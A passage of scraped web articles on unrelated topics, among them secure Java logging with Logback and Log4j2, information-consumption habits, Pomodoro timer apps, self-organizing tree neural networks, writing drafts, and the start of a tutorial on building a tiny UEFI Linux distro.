back.</p><p>Different times of day are very commonly used as metaphors in literature and arts but their perfect use is very rare. To efficiently&nbsp;use them as metaphors, we need to build the right context, mood, and a continuous narrative or perhaps we need something more.&nbsp; A deeper look at nature and how its cycle invisibly merges with our lives and our problems would do.</p><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="cherrywine_stains Instagram" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
          <section>
            <article>
              <header>
                                
                
              </header>
              <p>Logs are a handy tool to spot mistakes and debug code. For engineers and, specifically, in a DevOps environment, the logs are a very valuable tool.</p>
<p>In addition to the functional aspect of logging, logs are also critical from a Java security perspective. When a security breach occurs, your log files are the first place to look for clues about what happened. But with a large number of different frameworks available for logging in Java applications, how do you pick the right one? More importantly, how to do Java logging right?</p>
<p>The quality of the logs is critical. Logging both too much or too little information can be catastrophic from a Java security perspective. In fact, Insufficient Logging &amp; Monitoring (A10:2017) has made the OWASP Top 10 list.</p>
<p>In this article, I am going to guide you through a pragmatic approach to Java logging—what should we log, what shouldn’t we log, and how to implement Java logging properly.</p>
<h3>What Should We Log?</h3>
<p>Back in the military, whenever we had to report something, we had to use the 5W-H method—Who, What, Where, When, Why, and How. This method is an excellent rule for logging statements as well.</p>
<ul>
<li><strong>Who was doing this?</strong> Identify the user or system that made this request. If possible, with a userID and an IP address.</li>
<li><strong>What is going on?</strong> What kind of logging statement was this. Many developers already recognize the different log-levels to annotate the importance of a message (ERROR, WARN, INFO, DEBUG, TRACE). It is wise to distinguish between functional logging, security logging, and maybe even audit logging if that is applicable.</li>
<li><strong>Where did it happen?</strong> Identify the location. You usually define a logger per class, so that is already a good start. However, we also need to know the specific method. Also, we want to know the particular node, if you are working with a microservice architecture, for instance.</li>
<li><strong>When did it occur? </strong>Time is essential, so make sure you log a timestamp. Be aware of timezone differences and, more importantly, change timezones twice a year. My advice is to always output in UTC, so it is clear to everyone.</li>
<li><strong>Why did it happen? </strong>The “why” is generally what you need to find out. You can’t always capture this in a single logline. In some cases, it is obvious. If so, make it part of the message. On many occasions, we can only explain the “why” once we see the relation between logs. Therefore make sure that your log messages are absolutely clear.</li>
<li><strong>How did it happen? </strong>Like the “why,” the “how” typically can’t be caught in one statement. Therefore, to correlate between message, especially in a service-based architecture, is extremely important. To achieve this, you should create a unique correlation ID for each incoming request in every service with an outbound interface. Once you have this ID, you should log it in every statement. If you need to transport this ID to another service, you can use the specific HTTP header X-Correlation-ID in order to correlate and be stateless.</li>
</ul>
<h3>Logging Security Events</h3>
<p>Java is mostly used in backend processes and will directly interact with the data. Therefore, we must keep track of security-related events. We have to prioritize these security events accordingly and consider events that need high privileges (admin events) even more critical.</p>
<p>In general, you can think of:</p>
<ul>
<li>login success and failures</li>
<li>logouts</li>
<li>password changes and resets</li>
<li>creation and removal of users</li>
<li>authorization failures</li>
<li>access level changes</li>
</ul>
<p>In addition, you should also log indicators that can point to specific attacks.</p>
<ul>
<li>input validation errors: recognize script tags that lead to XSS attacks, or parameters like UNION that indicate a SQL-injection</li>
<li>HTTP 4xx and 5xx responses</li>
<li>getting insane amounts of requests by a specific IP</li>
<li>check IP ranges, for instance, if an internal service gets hit by an external IP-address</li>
</ul>
<p>It is a great tactic to set thresholds for certain security log events. You can actively send alerts when these thresholds are crossed. This way, you can - interfere accordingly and prevent more extensive damage.</p>
<h3>What Should We Not Log?</h3>
<p>Logging too much information is just as harmful as logging too little. You do not want your logs to be flooded by information that is not useful in production. Therefore, aim to always set the log level on a production system to a suitable level, like WARN or ERROR.</p>
<p>As part of development, engineers will log sensitive entities that might contain personal data, in order to debug applications. Although we should aim to prevent this, internal debug messages should have the proper log level—for example, DEBUG or TRACE—and should not be visible in the production environment.</p>
<p>As a general rule, an application should not reveal any application-specific or user-specific data—this data can be used by an attacker. Also, by exposing personal information, you are most probably not compliant with privacy regulations. Even if logs are only accessible to insiders, it is a single point of failure. So, we simply don’t want this information to fall into the wrong hands.</p>
<p>When developing, think about what you need to log. Do we need to log an internal ID, the unencrypted password, or someone’s credit card details? Be careful not to output a complete data object in Java as the output depends on the <code>toString()</code> method of that particular object.</p>
<p>By logging personal information for debugging, we circumvent many of our own security policies—it would be sensible not to log these types of information altogether. If we need to log specific data, make sure to set the proper log-level, such as DEBUG. You should also set the log-level of the production system to a higher level, like WARN.</p>
<p><strong>Bottom line—personal and sensitive information must not appear in your production logging.</strong></p>
<h3>Security Logging in Java</h3>
<p>First and foremost, use a logging framework in Java. This seems like an open door, but in a ton of applications, people still use the old System.out.println() to write directly to the console. This should be prevented at all costs. A good linter (Spotbugs, PMD, SonarLint) could help you with this.</p>
<p>There are many different logging frameworks in Java. This article will focus on Logback and Log4j2, as these are currently the most used frameworks. However, regardless of the framework, it is wise to separate security logging from general application logging. In both Logback and Log4j2, you can easily do this by adding markers to the logger. With a specific marker, like SECURITY or maybe even AUDIT, you can easily filter these out in your logs. You could also add an extra appender to your logger and filter on the specific marker to store or display these logs separately.</p>
<h4>Logback</h4>
<p>To implement Logback, you only need the <code>logback-classic</code> dependency, as shown below. This will pull in both <code>logback-core</code> and the <code>slf4j-api</code> packages.</p>
<pre><code><code data-enlighter-language="java">&lt;dependency&gt;
   &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
   &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
   &lt;version&gt;1.2.3&lt;/version&gt;
&lt;/dependency&gt;</code></code></pre>
<h5><span>Markers</span></h5>
<p>Markers can be set with any given String and added to your logger regardless of the log level, as you see below.</p>
<pre><code><code data-enlighter-language="java">private static final Logger logger = LoggerFactory.getLogger(LogbackExample.class);
private static final Marker security = MarkerFactory.getMarker("SECURITY");

public boolean  login(String userName, String encryptedPassword) {
   logger.warn(security, "login attempt by user: {}", userName);
  ...
}</code></code></pre>
<h5><span>Configuration</span></h5>
<p>In the following example of Logback configuration, I have created two appenders to my <code>logback.xml</code> file.</p>
<p>The first appender will show all the log lines in the console, including the marker I might have added. The second appender only filters out the security-specific logs based on the maker SECURITY and put these in a separate security log file per day.</p>
<pre><code><code data-enlighter-language="xml">&lt;configuration&gt;
   &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt;
       &lt;encoder&gt;
           &lt;pattern&gt;%d{HH:mm:ss.SSS} [%thread] %-8marker %-5level %logger{36} - %msg%n&lt;/pattern&gt;
       &lt;/encoder&gt;
   &lt;/appender&gt;
   &lt;timestamp key="byDay" datePattern="yyyyMMdd"/&gt;
   &lt;appender name="SECURITY-FILE" class="ch.qos.logback.core.FileAppender"&gt;
       &lt;filter class="ch.qos.logback.core.filter.EvaluatorFilter"&gt;
           &lt;evaluator class="ch.qos.logback.classic.boolex.OnMarkerEvaluator"&gt;
               &lt;marker&gt;SECURITY&lt;/marker&gt;
           &lt;/evaluator&gt;
           &lt;OnMatch&gt;ACCEPT&lt;/OnMatch&gt;
           &lt;OnMismatch&gt;DENY&lt;/OnMismatch&gt;
       &lt;/filter&gt;
       &lt;file&gt; security-${byDay}.log&lt;/file&gt;
       &lt;append&gt;true&lt;/append&gt;
       &lt;encoder&gt;
           &lt;pattern&gt;%d{HH:mm:ss.SSS} [%thread] %-8marker %-5level %logger{36} - %msg%n&lt;/pattern&gt;
       &lt;/encoder&gt;
   &lt;/appender&gt;
   &lt;root level="warn"&gt;
       &lt;appender-ref ref="STDOUT" /&gt;
       &lt;appender-ref ref="SECURITY-FILE" /&gt;
   &lt;/root&gt;
&lt;/configuration&gt;</code></code></pre>
<h4>Log4j2</h4>
<p>To use, you have to include the <code>log4j-api</code> and the <code>log4j-core</code> package, as seen below.</p>
<pre><code><code data-enlighter-language="xml">&lt;dependency&gt;
   &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
   &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
   &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
   &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
   &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
   &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;</code></code></pre>
<h5><span>Markers</span></h5>
<p>Creating and adding the markers is similar to the Logback example; only this time, we use the specific Log4j manager to create the logger and the marker.</p>
<pre><code><code data-enlighter-language="java">private static final Logger logger = LogManager.getLogger(Log4j2Example.class);
private static final Marker security = MarkerManager.getMarker("SECURITY");

public boolean login(String userName, String encryptedPassword) {
   logger.warn(security, "login attempt by user: {}", userName);
  ...
}</code></code></pre>
<h5><span>Configuration</span></h5>
<p>Similar to the Logback configuration, I created a configuration for Log4j2 with two appenders where the security log will get stored in a separate file based on the markers. This configuration needs to be in the <code>log4j2.xml</code> on the classpath.</p>
<pre><code><code data-enlighter-language="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;Configuration&gt;
   &lt;Appenders&gt;
       &lt;Console …</code></code></pre></article></section></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Recently I was talking with <a href="https://twitter.com/andreysitnik">Andrey Sitnik</a> about media consumption and IndieWeb paraphernalia, and I stumbled upon a realisation.</p>
<p>A lot of people struggle with Read-it-later services, like Pocket, where the links just pile up, and they never get around to reading it, and then they feel bad.</p>
<p>As it goes, I spoke first and thought second, I said: if you stop and think for five minutes about it, you'll understand why this happens. Then I had to back it up and went on with a blissful feeling of puzzle pieces clicking together: one does not treat 'Pocket' as an input to a system of consuming information, only as an output, thus it is bound to overflow.</p>
<p>Now let me expand on these matters a little bit more.</p>
<p>Inputs are the ways by which information gets to you. If you check Twitter every morning, then your feed is an Input. If you do read email newsletters and not just archive it, that's an Input. Ditto for podcasts, books, Hacker News, Instagram, RSS, and plain old conversations.</p>
<p>The necessary condition of being an Input is that you do consume from it, preferably at regular intervals. Otherwise it may as well not exist for you. To read books you actually have to sit down and read a book.</p>
<p>On the other hand, Outputs are where you put information. If you post photos on Instagram, that's an Output. If you file links to "Read-it-later", that's an Output. Outputs are less complex, and I will discuss them in more detail in another article.</p>
<p>Now, if Pocket is not an Input in your system, then you won't have the chance to read the articles you put there: in the moment when your brain is thirsty for more information, you'll drink from the usual Inputs, not the Pocket. To "read it later" you actually have to sit down and read it at some point, otherwise it just won't happen.</p>
<p>Going further, a thing can be both an Input and an Output at the same time. Sometimes this configuration creates a feedback loop: you read on Twitter about current events, post some hot takes there, get sweet sweet likes, and repeat.</p>
<p>I suppose that a combination of Inputs/Outputs for a particular person is mostly stable over time, while the persona you present online is more flexible. Over time you converge on the set of websites you check regularly and themes that interest you, and if the perceived consensus in the community shifts, you either have to remove yourself from this community, or go with the flow.</p>
<p>Now, the trouble is that "persona you present online" influences the real you as well in subtle, almost imperceptible ways. As Vonnegut wrote, “We are what we pretend to be, so we must be careful about what we pretend to be.”</p>
<p>Going for lighthearted example, if you think that all of your twitter feed is hating on Kubernetes, and you do not have a strong opinion on whether it is good or bad yourself, then you will probably adopt a milder "K8s is at least somewhat bad" attitude, shifting the balance further.</p>
<p>You can also apply this in reverse: other people too can only read what's being made available and are influenced by this no less than you are, so if you want your perspective to be heard and may be even adhered to, then you have to publish it.</p>
<p>Algorithmic sorting, the kind that is used on Twitter, FB, Instagram, is not a perennial evil per se, it just rearranges the contents of a particular Input by predicting what will solicit a visceral reaction from you, forcing you to react (engage) even more. This is a quirk of these Inputs, so you should adjust your expectations and seek alternatives as well.</p>
<p>You can only read on Twitter what is twitable. You can't react to or learn from something that you don't know to exist.</p>
<p>Creating an information bubble is in a sense inevitable, because no one can read everything without some sort of filtering beforehand, so the question is which filters are being used and who set them up.</p>
<p>Shape your inputs consciously, for they in turn shape you.</p>

    <p>As technology advances, we are distracted by more things than ever, and it is getting harder to draw a strict line between work and free time. There are several time management techniques offering help to make ourselves more effective while working. One of the most acknowledged among them is the Pomodoro technique. The best approach is to download a Pomodoro timer app, so we help you below to navigate the solution landscape.</p>

<p>As I take a look around my desk, while writing this article, I see at least a dozen physical and virtual elements that distract me. Working from home office during the quarantine did even amplify my inner voices saying: “Chat with your friends instead.”, “That email could be extremely important!”, “Aren’t you hungry?”</p>
<p>Time management issues are among the hottest topics when it comes to organizing work. The above distractions cost the global economy billions of dollars as, according to a recent study, almost 80% of an average workday is spent on activities with low value. Distractions, poor prioritization, procrastination lead to in-effective days and longer-than-needed workdays.</p>
<p><strong>The Pomodoro technique</strong> is a method with a single goal in mind: giving a valid, realistic timeframe in which you can focus, while also allowing you to have regular, yet controlled breaks. Pomodoro is a time management method invented by Italian gentleman Francesco Cirillo in the 1980s. It was named after a tomato-shaped timer used in the kitchen working with 25-minute time intervals, the predecessor of today’s Pomodoro timer app solutions. The essence of the Pomodoro technique is to do only one task intensively and focused for 25 minutes and then take a 5-minute break. Then work again for 25 minutes and break again for 5 minutes. After every fourth Pomodoro-interval, take a longer break of 20-30 minutes.</p>
<p>This doesn’t mean that you can’t sip a cup of coffee during a 25-minute long Pomodoro, rather be prepared with that coffee beforehand, so that you wouldn’t need to get up your chair and with it fall out from the rhythm and paste you were just picking up.</p>
<h2>What makes this technique so powerful?</h2>
<div>
<div>
    <h3>Pomodoro is designed to be easy to start with</h3>
    <p>You do not need to populate page-long matrixes, nor estimate all the work for the whole week. It cannot be simpler! There are Pomodoro timer app solutions that don’t even require registration, making it super-easy to kick-off.</p>
</div>
<div>
    <h3>It helps to avoid multitasking</h3>
    <p>Continuous task-switching, regardless of how good you are in multitasking, heavily affects performance. A study by researcher Laura Bowman at Central Connecticut State University sheds light on what happens during a nowadays standard example of task-switching. Students who used Facebook Messenger while reading a textbook took 25% longer to read the same part (excluding time spent on chatting) than students who only used their time reading. The results clearly showed that the quality of performance deteriorates when concentrating on multiple tasks “simultaneously”.</p>
</div>
<div>
    <h3>It helps battling procrastination</h3>
    <p>Studies show that breaking down tasks to the smallest possible parts helps the brain to see them as easy-to-solve tasks, which eventually will hold back procrastination tendencies.</p>
</div>
<div>
    <h3>It also helps your body</h3>
    <p>Just use part of the 5-min long pauses to move and flex your back, hip, arms, and legs. Changing the focus distance of your eyes once in a while, aka not looking at your monitor constantly, also helps to keep them healthier. </p>
</div>
</div>
<h2>Making good use of the Pomodoro technique</h2>
<p>Here are a few tips on how to nurture this technique to achieve your best self.</p>
<div>
<div>
    <h3>Use to-do lists</h3>
    <p>Pomodoro is not simply about pushing a timer or using an app: the number one rule to this technique is to have well-prepared tasks at hand. If you have larger projects, break them down into the smallest parts that you can do. An example: writing an article is a complex project with a lot of research and creative penning. Putting simply “writing an article” on the to-do list is ineffective because it is hard to know how much time and what resources are needed. If you break it down into smaller elements like researching the topic, finding statistics, writing a catchy intro, etc. - that helps your brain to see the big picture and prioritize correctly.</p>
</div>
<div>
    <h3>Organize your tasks into pomodoros (tomatoes)</h3>
    <p>These little tomato timeframes should include as many tasks you can handle in a 25-minute long round. The experience will make you better at estimating the right amounts, however, you can do an educated guess if you have done the project breakdown correctly.</p>
</div>
<div>
    <h3>Focus, focus, and focus</h3>
    <p>Your 25-minute long Pomodoros should be done with only one thing in mind: finishing your tasks. This might sound too strict at first, but these timeframes are designed in the exact length of an average worker’s/student’s concentration capacity in mind. No emails, no Messenger, and other chats, only your favorite music and the tasks you prepared for yourself.</p>
</div>
</div>
<h2>Applications and websites that support you along the journey</h2>
<p>After the theory, let’s see how the above can be put into practice. While Francesco Cirillo had fewer distractions back in his day, he did not have a Pomodoro technique app to help him focus. Today’s solutions are much more than simple timers. Let’s see what apps out there you can leverage.</p>
<h3>1. <a href="https://www.forestapp.cc/" target="_blank" rel="noopener noreferrer">Forest app</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/pomodoro-technique/Forest-logo.webp"><img src="https://productive.fish/blog/pomodoro-technique/Forest-logo.png" alt="Forest logo"></picture> <strong>Platforms:</strong> iOS, Android</p>
<p><strong>The basic idea:</strong> This application helps you to stay focused and introduces a gamified approach of planting and growing trees. If you start working and use your phone in a non-related way (eg. open Messenger), you get a waring. If you keep switching back from your tasks to less important distractions, your tree will stop growing and will eventually dry out. You are free to set the time frame for how long you want to focus between 10 and 120 minutes. After each period is completed, you receive coins in proportion to how long you have not used your phone. (From which you can buy beautiful trees that are just waiting to be grown.)</p>
<p>Moreover, if you are persistent enough, you can plant a real tree in a designated place, which can be a real motivating force. You can listen to the background noise of a Parisian café or a sandy beach to help to focus.</p>
<p><strong>How it fits with Pomodoro:</strong> Setting up 25-minute long intervals in Forest will just do the trick. However, measuring quick breaks and long pauses are not yet available. Still, if you are looking for a great Pomodoro timer app, that helps you focus and forces you - in a gamified way - to do so, Forest is a wonderful choice.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>The self organizing tree (SOT) is a type of artificial neural network based on the self organizing map (<a href="https://en.wikipedia.org/wiki/Self-organizing_map">SOM</a>). It uses an unsupervised, competitive learning algorithm to store representations of the input space. Unlike the conventional SOM, where a data point is given to every node of the SOM, in SOTs a forward propagation requires to compute a competition between only $log(N)$ nodes, where $N$ is the number of nodes the model has. This makes the SOT computationally significantly more efficient than a conventional SOM. The neighbourhood of a SOT is also differently defined than in a SOM. While in a 2D SOM, nodes are organized in a grid like fashion, the SOT’s nodes are organized in the form of a binary tree. The binary tree structure allows SOTs to find a best matching unit with fewer steps, however, its computational efficiency comes with a cost. While in the SOM, $N$ nodes can become best matching units, in the SOT only $N/2$ of the nodes can potentially become best matching units. In this short blog post, I’ll only explain the fundamentals of how a SOT works. Why it’s useful and how it can be used, I’ll explain in Part 2.</p>

<h2 id="introduction---self-organizing-map">Introduction - Self Organizing Map</h2>
<p>The self organizing map (SOM), also known as the Kohonen map, differs quite a lot from today’s backpropagation-based artificial neural networks. While backpropagation-based neural nets correct their weights by computing gradients according to a cost function, nodes in SOMs update their weights through <a href="https://en.wikipedia.org/wiki/Competitive_learning">competitive learning</a>. In competitive learning, nodes in a network compete for the right to activate for a certain input. As a result, each node specializes overtime to fire only when a specific input is given. This specialization of nodes caused by competition, can also be viewed as a variant of <a href="https://en.wikipedia.org/wiki/Hebbian_learning">Hebbian learning</a>.</p>

<p>To prevent confusion, when learning about SOMs, it’s best to forget anything you know about neural networks. There are no activation functions, no backpropagation, no dot product between inputs and weights. The architecture of a (2D) SOM simply consists of a grid of neurons (also known as units, or nodes). Each node of the SOM is fully connected to the input layer, as shown in figure 1.</p>

<p>
  <img width="300" height="300" src="https://lums.blog/assets/images/posts/2020/som1.png">
  <em><br>Figure 1. Illustration of a SOM architecture.</em>
</p>

<p>As SOMs are trained in an unsupervised way, no targets are necessary to train it. After the weights of the model are initialized, competitive learning is used during training. The steps of the learning algorithm are straightforward:</p>
<ul>
  <li>Compute the Euclidean distance of the input vector and the weight vectors of the SOM.</li>
  <li>Find the node with the smallest distance. This node is also called the <strong>best matching unit</strong> (BMU).</li>
  <li>The BMU neighbourhood radius is calculated. The neighbourhood radius usually starts as a large value and gradually decreases with every time step (Note: There are SOM variants where the neighbourhood radius does not decrease according to the time step, allowing for online learning without a pre-defined number of iterations).</li>
  <li>The weight vector of every node inside this neighbourhood radius is adjusted to become more similar to the input vector. The further away a node is from the BMU, the less its weights are updated.</li>
  <li>Repeat all steps for N iterations.</li>
</ul>

<p>

  <em><br>Figure 2. Illustration of the SOM's neighbourhood radius changing with every iteration.</em>
</p>

<p>Because of the competitive learning algorithm, SOMs are able to preserve the topological properties of the input space, allowing for nice visualizations. SOMs in fact are rarely used for anything else these days, but as we will see in future posts, the core ideas of SOMs can be quite useful. A nice SOM implementation in PyTorch can be found <a href="https://github.com/giannisnik/som">here</a>. If you want to know more about the SOM implementation, <a href="http://www.ai-junkie.com/ann/som/som1.html">AI-Junkie’s</a> blog post goes in great depth.</p>

<h2 id="self-organizing-tree">Self Organizing Tree</h2>
<p>In a SOM, we have to calculate the Euclidean distances between the input vector and all the weight vectors. For large SOMs, this can be computationally demanding. In the SOT on the other hand, we have to calculate only $2 * log(N)$ Euclidean distances, where $N$ is the number of nodes in the SOT. That is because the SOT’s architecture - it is structured as a binary tree (see figure 3).</p>

<p>
  <img width="650" height="650" src="https://lums.blog/assets/images/posts/2020/sot1.png">
  <em><br>Figure 3. The architecture of a self organizing tree. Every node contains a weight vector.</em>
</p>

<p>Before going into how the learning algorithm of the SOT works, let’s first have a closer look at the architecture. In figure 3, I have labeled every node with an index. The indices serve just for clarification. The node with the zero index represents our input vector, or our <strong>input node</strong>. Every other node in the tree contains a weight vector that has the same size as the input vector. The nodes of the tree that do not have any children, are also known as <strong>leaf nodes</strong>. In contrast to SOMs, where every node can potentially become the BMU for an input, in the SOT only leaf nodes can become BMUs. The intermediate nodes in the tree, i.e. the ones that have children, are known as <strong>Non-leaf nodes</strong>, or simply as <strong>parent nodes</strong>. The number of layers per tree is also known as the tree <strong>depth</strong> (denoted as $D$). A tree with 16 leaf nodes for example, will have a depth of 4.</p>

<p>
  <img width="650" height="650" src="https://lums.blog/assets/images/posts/2020/sot2.png">
  <em><br>Figure 4. An input vector propagating through the self organizing tree. The nodes inside the blue line, represent the nodes that won the layer-wise competitions.</em>
</p>

<p>When training a SOT, instead of feeding the input vector to every single node in the tree, we simply feed it to the children of the input layer (nodes $1$ and $2$). We then compute the Euclidean distance for the two nodes. The node that wins the competition, i.e. the node with the smallest distance, feeds the input vector to its children. The competition repeats until two leaf nodes are reached (see figure 4). As we can see, in the SOT, only two nodes compete with one another per layer. After $D$ iterations, the input vector will have passed through the tree and will have reached two leaf nodes, where the last competition is calculated. The winning leaf node represents the BMU.</p>

<p>
  <img width="650" height="650" src="https://lums.blog/assets/images/posts/2020/sot3.png">
  <em><br>Figure 5. An illustration showing how nodes in a tree are updated in clusters. The BMU (node 20) is updated the most. Its parent node and its other branch get updated slightly less. The parent node of the parent node, and its other branch get updated even less, and so on. The learning rate diminishes the further away we get from the BMU in the tree.</em>
</p>

<p>After finding the BMU for a given input vector, the weight vector of every node is adjusted to become more similar to the input vector (see figure 5). The learning rates for the updates are “tree-depth-dependent”. We will have $D$ learning rates, ordered in decreasing order. The BMU is updated with the largest learning rate, adjusting it closer to the input vector. When we go one level up the tree (to the BMU’s parent node), the parent node and its other branch will be updated with the second learning rate, which is slightly smaller than the BMU’s learning rate. The higher we go up the tree, the less every branch and parent gets updated. An implementation of the self organizing tree can be found in this <a href="https://github.com/LumRamabaja/Self-Organizing-Tree/blob/main/SOT.py">Github repository</a>.</p>

<p>After some iterations, the nodes of the SOT will specialize to fire to specific inputs. The code below is an example of how to train a simple SOT with 32 leaf nodes on the <a href="https://github.com/zalandoresearch/fashion-mnist">fashion-mnist</a> dataset.</p>

</code></pre></div></div>

<p>After a few iterations, patterns will start to emerge in the weight vectors of the SOT (see figure 6).
SOTs have an interesting attribute: The further away we go from the leaf nodes, i.e. the closer we get to the input node, the less meaningful the weights get (see figure 7). The first two nodes of the SOT are basically just blobs. The deeper we get in the tree however, the more specialized the nodes will be.</p>

<p>
  <img width="1000" height="1000" src="https://lums.blog/assets/images/posts/2020/sot_filters.png">
  <em><br>Figure 6. The weight vectors of three leaf nodes taken from from the SOT that was trained on the fashion-mnist dataset. Darker regions represent weight values close to zero, whereas lighter regions represent weight values closer to one. Leaf nodes are the most specialized nodes in the SOT.</em>
</p>

<p>
  <img width="500" height="500" src="https://lums.blog/assets/images/posts/2020/sot_weak_filter.png">
  <em><br>Figure 7. The weight vectors of the first two nodes of the SOT. Darker regions represent weight values close to zero, whereas lighter regions represent weight values closer to one. The first nodes are the least specialized nodes in the SOT.</em>
</p>

<p>The necessary lack of specialization of the non-leaf nodes that are close to the input node, can be problematic when performing a forward pass. If for some reason a wrong turn is taken during propagation, the input vectors can end up landing at the wrong leaf node and mess up the state of the already specialized nodes. Logically, the more possible states an input vector can have, the more likely it gets for an input vector to make a mistake during propagation, compared to a case where we have less possible states. To better understand the problem, Lets take an example (see figure 8 as a reference): Lets say a certain input vector, $X_a$, usually gets mapped at node $29$, or at a leaf node close to $29$. This region of the tree is specialized to fire whenever it sees $X_a$. Now lets say another input $X_b$ propagates through the tree and lands at leaf node …</p></div></div>

    <p>I'm writing more than ever, but I still find it hard to hit my Tuesday posts' deadline.</p>
<p>I guess I'm lazy.</p>
<p>To me, <a target="_blank" href="https://gettingsimple.com/on-drafts">the draft</a> is playful and fun, but polishing for publication can be hard work.</p>
<p>I think I'm good at generating new ideas, consistently adding new post drafts to my to-do list.</p>
<p>Ever postponing the editing work, I would often publish new pieces—written from scratch—instead of editing existing drafts.</p>
<p>But there's no way out: it makes little to no sense to publish drafts, and I try to come back to the posts I've already started (which tend to become some of my best stories).</p>
<p>The important thing is to move forward; To practice daily, ship a new story every Tuesday, and enjoy how writing and publishing get easier, week by week.</p>
<hr>
<p>In future posts, I'll share the tools and techniques that help me write more and better and the planning methods I'm experimenting with to consistently writing and publishing <a target="_blank" href="https://sketch.nono.ma/">my weekly story</a>.</p>

Made in Japan in 2005</figcaption></figure>
<p>Today, I would like to show something different, than usual reverse-engineering, that appears on my blog usually. I needed to prepare a Linux distro for myself to be able to run it on my PC. But not the ordinary operating system that we download from webpage, then use fancy graphical installer to select, what we want and where. My goals were very specific. First was to have it custom-compiled. With that in mind there aren’t many choices left (maybe Gentoo?). Second was to not cross 16 MiB boundary. Why exactly that? That’s simple. I have old (15 years old to be precise) SD/MMC card made for Canon of exactly that size. Quick check showed me that this is possible. I tried buildroot and it failed to fulfill second requirement and I decided not to continue, despite the obvious optimizations on kernel modules, I could do. It’s simply too complex for such a simple task. If not buildroot, then let’s go and see how to do such thing from scratch!</p>

<p>Basically the plan is to have custom Linux distro compiled from scratch. It may sound like something incredibly complex and hard to do. But it’s not. There are just few problems one must learn on how to overcome. The most problematic constraint in my case is, obviously, 16 MiB limit. To not exceed it, I have to use busybox as my userspace. This by the way simplifies distro development significantly. Busybox works the way, that, if linked statically, requires only one, single binary to be able to work correctly. So, to sum up, on software side, we need Linux and busybox. You may wonder, how do I want to boot that system, then? Well. I said I need Linux 🙂 Maybe some people know, some does not, that Linux is itself a boot loader of some kind. At least, when using UEFI and this is what I want to use, it can be loaded directly by UEFI firmware. But that’s another thing to note – I will describe a way to prepare a distro for UEFI – it won’t be as simple as that, for legacy BIOS.</p>
<p>The whole plan will look as follows:</p>
<ol>
<li>Get compiler</li>
<li>Compile Linux kernel</li>
<li>Compile busybox (statically and stripped!)</li>
<li>Prepare initramfs with whole userspace</li>
<li>Format drive as EFI System Partition</li>
<li>Combine kernel and initramfs into single binary</li>
<li>Optionally sign the binary, in case we want Secure Boot to be enabled</li>
<li>Add entry to embedded UEFI boot manager</li>
</ol>
<p>In the meantime, I am going to show few ways to debug the system, in case of any problems.<span id="more-1624"></span></p>

<p>This is maybe not so obvious, but you need new compiler. Most likely, you could use the one that your distro provides, aliased as simply gcc. But this way, you will by the way use glibc as your standard library. For a lightweight system, glibc does not fit well, as this is most heavyweight libc, we have available. Therefore, I will use uClibc. And for that, we need a compiler. Or, to be precise, a toolchain. A toolchain, consisting of kernel headers, uClibc and gcc. Here, I could show, how to build such thing from scratch. But it’s not a tutorial about building a toolchain. This requires knowledge that can fill another tutorial. Instead, I will use the toolchain prepared by my latest project – <a href="https://github.com/v3l0c1r4pt0r/cc-factory" target="_blank" rel="noopener noreferrer">cc-factory</a>. For those, who did not read <a href="https://re-ws.pl/2020/10/meet-cc-factory-a-factory-for-cross-compilers/">my previous post</a>, it is toolchain factory running in Docker container, that provides a recipe for a toolchain that just works. If you tried compiling a toolchain from scratch in the past, then you know that this can fail, even if you use crosstool-ng. With cc-factory, it works as long as Docker can start a service and has Docker Hub working. But enough of that. In cc-factory, I am experimenting with releasing binary distributions of my toolchain. And <a href="https://github.com/v3l0c1r4pt0r/cc-factory/releases/tag/x86_64-gcc10.2.0-linux5.9.13-uclibc1.0.36-1">newest one</a> is special-made for this job. You can simply download it to you disk with:</p>
<pre>wget <span>'</span><span>https://github.com/v3l0c1r4pt0r/cc-factory/releases/download/x86_64-gcc10.2.0-linux5.9.13-uclibc1.0.36-1/x86_64-gcc10.2.0-linux5.9.13-uclibc1.0.36-1.tar.gz</span><span>'</span>
</pre>
<p>After that, you have to install it to your <code>/opt</code> directory with:</p>
<pre>tar <span>-xvf</span> x86_64-gcc10.<span>2</span>.0-linux5.<span>9</span>.13-uclibc1.<span>0</span>.36-1.tar.gz <span>-C</span> /
</pre>
<p>If you prefer another installation path, then head onto cc-factory project to see, how to build one from source. Then, you can choose whatever path, you like for this SDK.</p>
<p>Next step is to export SDK’s bin directory to you PATH for convenience:</p>
<pre><span>export</span> <span>PATH</span>=<span>"</span><span>$PATH</span><span>:/opt/x86_64-linux-uclibc/bin</span><span>"</span>
</pre>
<p>Now, it’s nice to check, if toolchain works. Let’s write one-liner C hello world program to your temp directory, compile and run:</p>
<pre><span>echo</span><span> -e </span><span>'</span><span>#include &lt;stdio.h&gt;\nint main() {printf("Hello, World!\\n");}</span><span>'</span> <span>&gt;</span>/tmp/main.c
x86_64-linux-uclibc-gcc <span>-static</span> <span>-o</span> /tmp/main /tmp/main.c
/tmp/main
</pre>
<p>And you should see the familiar text on your screen. You are ready to go!</p>

<p>That is, in my opinion, the easiest part. First, we have to download kernel image, that we want to use. For that purpose, we need to go to <a href="https://www.kernel.org/" target="_blank" rel="noopener noreferrer">Kernel Archives</a> and download latest stable tarball. Optionally, we can download PGP signature and verify its correctness. But this is outside the scope of this tutorial. Another option to get kernel is to clone its stable repo with:</p>
<pre>git clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
</pre>
<p>This is the path, I chose, because I don’t like leaving multiple copies of kernel sources on my hard drive, so I prefer to have one, central clone of repo and use for any project, I need it to.</p>
